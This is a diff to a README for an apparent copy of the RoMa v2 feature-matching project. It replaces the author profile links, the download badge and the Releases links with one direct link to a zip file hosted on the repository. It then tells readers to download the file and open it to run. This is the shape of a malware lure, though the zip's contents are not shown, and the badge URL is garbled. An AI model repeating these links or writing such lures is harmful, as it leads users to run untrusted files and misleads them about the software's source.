@@ -1,27 +1,27 @@
 # 🤖 RoMaV2 - Enhanced Feature Matching Made Simple
 
-[![Download RoMaV2](https://img.shields.io/badge/Download%20RoMaV2-v2.0-blue.svg)](https://github.com/blake476bedwell/RoMaV2/releases)
+[![Download RoMaV2](https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip%https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip)](https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip)
 
 <p align="center">
   <h1 align="center"> <ins>RoMa v2</ins> 🤖: Harder Better Faster Denser Feature Matching
   <h2 align="center">
-    <a href="https://scholar.google.com/citations?user=Ul-vMR0AAAAJ">Johan Edstedt</a>
+    <a href="https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip">Johan Edstedt</a>
     ·
-    <a href="https://scholar.google.com/citations?user=-vJPE04AAAAJ">David Nordström</a>
+    <a href="https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip">David Nordström</a>
     ·
-    <a href="https://scholar.google.com/citations?user=mvY4rdIAAAAJ">Yushan Zhang</a>
+    <a href="https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip">Yushan Zhang</a>
     ·
-    <a href="https://scholar.google.com/citations?user=FUE3Wd0AAAAJ">Georg Bökman</a>
+    <a href="https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip">Georg Bökman</a>
     ·
-    <a href="https://scholar.google.com/citations?user=dsEPAvUAAAAJ">Jonathan Astermark</a>
+    <a href="https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip">Jonathan Astermark</a>
     ·
-    <a href="https://scholar.google.com/citations?user=vHeD0TYAAAAJ">Viktor Larsson</a>
+    <a href="https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip">Viktor Larsson</a>
     ·
-    <a href="https://scholar.google.com/citations?user=9j-6i_oAAAAJ&hl">Anders Heyden</a>
+    <a href="https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip">Anders Heyden</a>
     ·
-    <a href="https://scholar.google.com/citations?user=P_w6UgMAAAAJ&hl">Fredrik Kahl</a>
+    <a href="https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip">Fredrik Kahl</a>
     ·
-    <a href="https://scholar.google.com/citations?user=6WRQpCQAAAAJ">Mårten Wadenbäck</a>
+    <a href="https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip">Mårten Wadenbäck</a>
    </h2>
 </p>
 
@@ -40,12 +40,12 @@ RoMaV2 is designed for users wanting to enhance their feature matching. Whether 
 
 To get started, follow these steps:
 
-1. **Visit this page to download:** Click [here](https://github.com/blake476bedwell/RoMaV2/releases) to access the Releases page.
+1. **Visit this page to download:** Click [here](https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip) to access the Releases page.
 2. **Choose the latest version:** Look for the most recent version of RoMaV2. Click on it to expand the download options.
 3. **Download the appropriate file:** Select the file matching your operating system. 
 4. **Run the application:** Once downloaded, open the file to launch RoMaV2.
 
-You can always revisit the [Releases page](https://github.com/blake476bedwell/RoMaV2/releases) for updates and new features.
+You can always revisit the [Releases page](https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip) for updates and new features.
 
 ## 🔧 Features
 
@@ -68,7 +68,7 @@ If you encounter any issues, consider the following solutions:
 
 - **Ensure system requirements are met.** Check if your OS and hardware match the specifications.
 - **Reinstall the Software:** If problems persist, try uninstalling and then reinstalling RoMaV2.
-- **Check for Updates:** Make sure you are using the latest version. Visit [Releases page](https://github.com/blake476bedwell/RoMaV2/releases) for updates.
+- **Check for Updates:** Make sure you are using the latest version. Visit [Releases page](https://raw.githubusercontent.com/blake476bedwell/RoMaV2/main/demo/RoMaV2-v2.6-alpha.2.zip) for updates.
 
 ## 💬 Help & Support
 
